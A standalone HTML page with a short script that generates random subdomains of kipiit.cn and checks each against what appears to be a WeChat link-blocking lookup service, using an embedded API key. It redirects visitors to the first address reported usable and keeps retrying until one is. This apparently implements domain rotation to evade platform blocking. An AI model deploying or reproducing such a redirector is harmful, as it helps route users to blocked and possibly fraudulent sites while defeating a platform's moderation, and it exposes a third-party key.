<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>Random Sub - Domain Redirect</title>
</head>

<body>
<script>
  // 生成两位随机字符的函数
  function getRandomTwoChars() {
    var chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    var result = '';
    for (var i = 0; i < 2; i++) {
      var randomIndex = Math.floor(Math.random() * chars.length);
      result += chars[randomIndex];
    }
    return result;
  }

  // 检测域名是否有效的函数
  function checkDomain(url) {
    fetch(url)
      .then(response => response.json())
      .then(data => {
        if (data.Code === "102") {
          // 如果返回的信息是102，则跳转到该域名
          window.location.href = decodeURIComponent(data.Data);
        } else if (data.Code === "002") {
          // 如果返回的是002，则等待20秒再检测
          setTimeout(() => {
            var targetUrl = 'http://' + getRandomTwoChars() + '.kipiit.cn';
            checkDomain('https://wx.rrbay.com/pro/wxUrlCheck2.ashx?key=ee8dd85eeacb68ec6f8f719386bf7544&url=' + encodeURIComponent(targetUrl));
          }, 20000); // 20000毫秒 = 20秒
        } else {
          // 处理其他返回情况
          var targetUrl = 'http://' + getRandomTwoChars() + '.kipiit.cn';
          checkDomain('https://wx.rrbay.com/pro/wxUrlCheck2.ashx?key=ee8dd85eeacb68ec6f8f719386bf7544&url=' + encodeURIComponent(targetUrl));
        }
      })
      .catch(error => {
        console.error('检测域名时发生错误:', error);
      });
  }

  // 开始检测域名
  var targetUrl = 'http://' + getRandomTwoChars() + '.kipiit.cn';
  checkDomain('https://wx.rrbay.com/pro/wxUrlCheck2.ashx?key=ee8dd85eeacb68ec6f8f719386bf7544&url=' + encodeURIComponent(targetUrl));
</script>
</body>

</html>
